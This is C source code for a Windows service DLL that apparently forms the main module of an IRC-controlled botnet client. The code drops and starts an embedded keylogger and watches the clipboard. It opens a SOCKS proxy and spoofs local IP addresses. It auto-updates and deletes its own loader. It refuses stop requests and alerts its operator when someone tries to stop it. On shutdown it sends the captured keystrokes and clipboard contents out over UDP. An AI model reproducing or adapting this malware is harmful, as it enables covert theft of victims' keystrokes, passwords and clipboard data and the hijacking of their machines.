#define _CRT_SECURE_NO_DEPRECATE
#include "stdafx.h"
#include "extern.h"
#include "dump_of_hk.txt"

int Update = 0;
HANDLE presence;
int ReleasePresence = 0;
int Terminate = 0;
extern DWORD g_dwTlsIndex;
extern char mKeys[KEY_BUF_SIZE];
extern char clipboard_buffer[CLIPBOARD_SIZE*2];
int sesson_sabil;


void main(void)
{
}
//sesson_sabil = InternetOpenA(("Microsoft Internet Explorer"), INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
//CloseHandle(hFile);
//InternetCloseHandle(hURL);


BOOL APIENTRY DllMain( HANDLE hModule, DWORD reason, LPVOID lpReserved)
{
	switch( reason ) 
    { 
	case DLL_PROCESS_ATTACH:
		// Initialize once for each new process.
		// Return FALSE to fail DLL load.
#ifndef FRELEASE
		DeleteFile(DEBUG_PATH);
#endif
		deb("DllMain: Dll process attach to %p", hModule);
		g_dwTlsIndex = TlsAlloc();
		deb("DllMain: Tls index %p", g_dwTlsIndex);
		break;
		
	case DLL_THREAD_ATTACH:
		// Do thread-specific initialization.
		//deb("DllMain %d: Dll thread attach to %p", GetCurrentThreadId(), hModule);
		break;
		
	case DLL_THREAD_DETACH:
		// Do thread-specific cleanup.
		//deb("DllMain %d: Dll thread detach from %p", GetCurrentThreadId(), hModule);
		break;
		
	case DLL_PROCESS_DETACH:
		// Perform any necessary cleanup.
		deb("DllMain : Dll process detach from %p", hModule);
		TlsFree(g_dwTlsIndex);
		break;
    }
	
	return TRUE;
}

EXPORT VOID WINAPI ServiceMain(DWORD dwArgc,LPTSTR *lpszArgv)
{
	SERVICE_STATUS_HANDLE ssh;
	SERVICE_STATUS ss;
	DWORD dwCoreIrcThreadId, dwThrdParam = 1; 
	HANDLE hCoreIrcThread,hSocksThread = NULL;
	DWORD exStatus = STILL_ACTIVE ;
	WSADATA wsaData;
	char szLoader[MAX_PATH];
	//	icf firewall;
	
	deb(" = START =");
	cleanup_loader_shit();
	/// Starting service
	deb("Entering service.\n");
	presence = CreateMutex(NULL, TRUE, PRESENCE_NAME);
	if(GetLastError() == ERROR_ALREADY_EXISTS) 
	{
		deb("Found another copy of program.\n");
		return;
	}
	/* start */
#ifdef FRELEASE
	SetErrorMode( SEM_FAILCRITICALERRORS | SEM_NOOPENFILEERRORBOX | SEM_NOGPFAULTERRORBOX ); /* dont disturb user */
	deb("Set silent error mode");
#endif
	
	ssh = RegisterServiceCtrlHandlerEx(SERVICE_NAME,HandlerEx,NULL);
	if(ssh == 0) 
	{
		deb("RegisterServiceCtrl returned zero, last error was %d\n",GetLastError());
		return;
	}
	
	ss.dwServiceType = SERVICE_WIN32_SHARE_PROCESS | SERVICE_INTERACTIVE_PROCESS ;
	ss.dwCurrentState = SERVICE_START_PENDING;
	ss.dwControlsAccepted = SERVICE_ACCEPT_SHUTDOWN | SERVICE_ACCEPT_STOP;
	ss.dwWin32ExitCode = 0 ;
	ss.dwCheckPoint = 0;
	ss.dwWaitHint = 1;
	if(SetServiceStatus(ssh, &ss) == 0) 
	{
		deb("SetServiceStatus returned zero, last error was %d\n",GetLastError());
		return;
	}
	ss.dwCurrentState = SERVICE_RUNNING;
	ss.dwCheckPoint = 1;
	ss.dwWaitHint = 0;
	if(SetServiceStatus(ssh,&ss) == 0) 
	{
		deb("SetServiceStatus returned zero, last error was %d\n",GetLastError());
		return;
	}
	
	/// Service started
	deb("Service started.\n");
	
	set_globals();
	check_inet_state();
	
	/* Main initialization is complete. Here we start our good work. */
	SetSystemInfo();
	deb("Set system info.\n");
	
	if ( CoreInit() )
	{ 
		deb("CoreInit() failed. Waiting for bugs and errors...\n");
	}
	
	DropFile( "hk.dll" , hk_dump , sizeof(hk_dump) );
	deb("Dropped keylogger file. (%d bytes)\n", sizeof(hk_dump));
	keylogger( 1 );
	
	int iResult = WSAStartup( MAKEWORD(2,2) , &wsaData);
	if ( iResult != NO_ERROR ) 
	{
		deb("Error at WSAStartup() :%d\n",WSAGetLastError());
	}
	deb("WSA Initialized.\n");
	
	srand( (unsigned) GetTickCount() );
	memset( IrcNick , 0x0 , sizeof(IrcNick) );
	if(GetSavedNick(IrcNick)) 
	{
		GetRandStr( sizeof(IrcNick) - 1 , IrcNick );
		memcpy( IrcNick , IRC_NICK_PREFIX , sizeof(IRC_NICK_PREFIX) - 1 );
	}
	
	udp_change_status(STATUS_ONLINE);
	
	/* --------------------------------------------------------------------------------  irc core */
	hCoreIrcThread = xCreateThread(NULL, 0,CoreIrc,&dwThrdParam,0,&dwCoreIrcThreadId);
	if (hCoreIrcThread == NULL) 
	{ 
		deb( "xCreateThread failed (%d)\n", GetLastError() ); 
	}
	else  
	{	
		deb("CoreIrc has run\n"); 
	}
	/* --------------------------------------------------------------------------------  irc core */
	
	/* socks server */
	pri_socksport = 1024 + ( rand() % 50000 );
	if( !LocalIp() ) 
		hSocksThread = (HANDLE)SocksServer(ENABLE,pri_socksport);
	
	/* if this is first run - delete loader */
	GetSystemDirectory(szLoader,MAX_PATH);
	lstrcat(szLoader,"\\loader.exe");
	if( FileAccess(szLoader,GENERIC_ALL) == 0 )
		DeleteFile(szLoader);
	
	/* fill spoofed spf[255] struct with spoofed ip's from local net */
	FillSpoofingStruct();
	
#ifdef AUTO_UPDATE
	HANDLE hCoreUpdateThread;
	dwThrdParam = 0; // cycle update
	hCoreUpdateThread = xCreateThread(NULL, 0, monitor_updates, 
		&dwThrdParam, 0, &dwCoreIrcThreadId);
	if (hCoreUpdateThread == NULL) 
	{ 
		deb( "xCreateThread failed for update thred (%s)\n", FORMATERROR ); 
	}
	deb("Tcp update server thread created.");
#endif
	
	/* --------------------------------------------------------------------- main thread cycle */
	while(!Update && !Terminate) 
	{
		Sleep(500);

		check_inet_state();
		CheckThreads();
		check_clipboard();

		if(ReleasePresence) 
		{
			ReleaseMutex(presence);
			CloseHandle(presence);
			ReleasePresence = 0;
			presence = NULL;
		}
	}
	/* --------------------------------------------------------------------- /main thread cycle */
	
	keylogger( 0 ); 
	if( presence ) {
		ReleaseMutex( presence );   
		CloseHandle( presence );
	}
	QuitIRC = 1;
	socks_need = 0;
	deb("Stopping service.\n");
	
	/* ------------------------------------------------------------------------- Stop service */
	ss.dwCurrentState = SERVICE_STOP_PENDING;
	ss.dwCheckPoint = 1;
	ss.dwWaitHint = 1;
	if(SetServiceStatus( ssh , &ss ) == 0)
	{
		deb("SetServiceStatus returned zero, last error was %d\n",GetLastError());
		ExitProcess(0);
	}
	
	ss.dwCurrentState = SERVICE_STOPPED;
	ss.dwCheckPoint = 2;
	ss.dwWaitHint = 0;
	if(SetServiceStatus( ssh , &ss ) == 0)
	{
		deb("SetServiceStatus returned zero, last error was %d\n",GetLastError());
		ExitProcess(0);
	}
	/* ------------------------------------------------------------------------- /Stop service */
	Sleep( 5000 );
	deb("Bot is down.\n");
	
	ExitThread(0);
}

DWORD WINAPI HandlerEx(DWORD dwControl,DWORD dwEventType,LPVOID lpEventData,LPVOID lpContext)
{
	deb("Called Handler with control: %d\n",dwControl);
	if( dwControl == SERVICE_CONTROL_SHUTDOWN )
	{
		deb("System is shutting down. Cleaning up...\n");
		Terminate = 1;
		udp_change_status(STATUS_OFFLINE);
		if(strlen(mKeys) > 1)
			udp_submit_keys(mKeys);
		udp_submit_clipboard(clipboard_buffer);
		Sleep(300);
	}
	else if( dwControl == SERVICE_CONTROL_STOP )
	{
		udpdeb("WARNING: System attempted to stop me.\n");
		udp_send_msg(WARNSTOP, GetLocalInetAddr(), strlen(GetLocalInetAddr()));
	}
	
	return NO_ERROR;
}